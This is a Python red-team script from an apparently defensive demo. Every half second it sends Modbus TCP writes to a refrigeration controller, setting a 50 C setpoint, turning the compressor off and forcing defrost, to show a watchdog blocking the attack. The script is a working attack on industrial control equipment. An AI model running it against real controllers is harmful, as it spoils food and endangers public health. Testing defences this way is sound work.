"""
Attacker — the rogue device on the store network. Runs on Daya's laptop.

This is the demo's red team. On our OWN simulated fridge, on our OWN closed demo
network, it recreates the October 2026 supermarket refrigeration attack: drive
the setpoint to an unsafe temperature and force a continuous defrost so the case
warms up and the food spoils.

It attacks continuously, once every half second, so you can watch Cold Guard's
state decide the outcome live:
  * watchdog ARMED  -> every attempt reads BLOCKED, the case stays cold
  * watchdog BYPASS -> attempts read GOT THROUGH, the case climbs past the
                       food-safety line
  * re-arm again    -> attempts go back to BLOCKED and the store controller
                       pulls the case back down to safe

Stop it with Ctrl+C. It only touches the addresses in profile.json.

Run:  python3 attacker.py            (reads profile.json for addresses)
"""

import json
import sys
import time

from pymodbus.client import ModbusTcpClient

PROFILE_PATH = sys.argv[1] if len(sys.argv) > 1 else "profile.json"
with open(PROFILE_PATH) as f:
    PROFILE = json.load(f)

HR_SETPOINT = 0
CO_COMPRESSOR = 0
CO_DEFROST = 1

DANGER_SETPOINT = 500   # +50.0 C in tenths — the headline from the real attack


def connect():
    host, port = PROFILE["watchdog"].rsplit(":", 1)
    return ModbusTcpClient(host, port=int(port))


def main():
    client = connect()
    client.connect()
    print("Attacker: continuously pushing the French supermarket attack.")
    print("(Ctrl+C to stop)\n", flush=True)

    while True:
        try:
            if not client.connected:
                client.connect()

            # Three malicious writes: unsafe setpoint, compressor off, defrost on.
            r1 = client.write_register(HR_SETPOINT, DANGER_SETPOINT & 0xFFFF)
            r2 = client.write_coil(CO_COMPRESSOR, False)
            r3 = client.write_coil(CO_DEFROST, True)

            results = [r1, r2, r3]
            blocked = all(r.isError() for r in results)
            through = all(not r.isError() for r in results)
            if blocked:
                status = "BLOCKED       "
            elif through:
                status = "GOT THROUGH ⚠ "
            else:
                status = "partial        "
            print(f"  attack -> {status}", end="\r", flush=True)

        except Exception:
            # Watchdog restarting or network blip; try to reconnect next loop.
            print("  attack -> no connection (watchdog restarting?)", end="\r", flush=True)
            try:
                client.close()
            except Exception:
                pass
            client = connect()

        time.sleep(0.5)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nAttacker stopped.")
